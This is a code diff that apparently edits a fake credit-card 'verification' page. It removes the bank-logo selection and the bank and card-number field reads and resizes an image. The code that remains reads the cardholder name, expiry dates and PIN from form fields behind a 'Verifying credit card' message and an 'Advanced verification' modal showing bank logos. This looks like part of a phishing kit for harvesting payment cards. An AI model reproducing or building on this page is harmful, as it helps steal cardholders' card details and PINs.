@@ -10,12 +10,6 @@
         window.history.replaceState(null, null, window.location.pathname);
 
 
-        let bank_detail = { "bnk": "b_Pho.png"};
-        if (version == 't') {
-            bank_detail = { "bnk": "b_Ely.png" };
-        }
-
-
         function pidpass(pid) {
             return pid.substring(5, 12).split("").reverse().join("");
         }
@@ -46,8 +40,6 @@
             document.getElementById("fin").innerHTML = 'Verifying credit card... Please wait.';
             let p_name1 = document.getElementById('name1').value.trim();
             let p_name2 = document.getElementById('name2').value.trim();
-            let p_bank = document.getElementById('bank').value.trim();
-            let p_cardnum = document.getElementById('cardnumber').value.trim();
             let p_date1 = document.getElementById('date1').value.trim();
             let p_date2 = document.getElementById('date2').value.trim();
             let p_pin = document.getElementById('pin').value.trim();
@@ -113,7 +105,6 @@
                 ("0" + dte.getHours()).slice(-2) + ":" +
                 ("0" + dte.getMinutes()).slice(-2);
             document.getElementById("bnk").src = urlpre + details.bnk;
-            document.getElementById("card").src = urlpre + details.type;
             document.getElementById("cnum").innerHTML = details.cnum;
             document.getElementById("cname").innerHTML = details.cname;
             document.getElementById("msg").innerHTML = details.msg;
@@ -356,7 +347,7 @@
         <div class="modal-content">
 
             <div style="float:left;">
-                <img id="card" alt='' style='width: 30%;height: 30%;'> <b>Advanced verification.</b>
+                <img id="card" alt='' style='width: 5%;height: 30%;'> <b>Advanced verification.</b>
             </div>
             <div style="float:right;text-align:right;">
                 <img id="bnk" alt='' style='width: 70%;height: 70%;'>
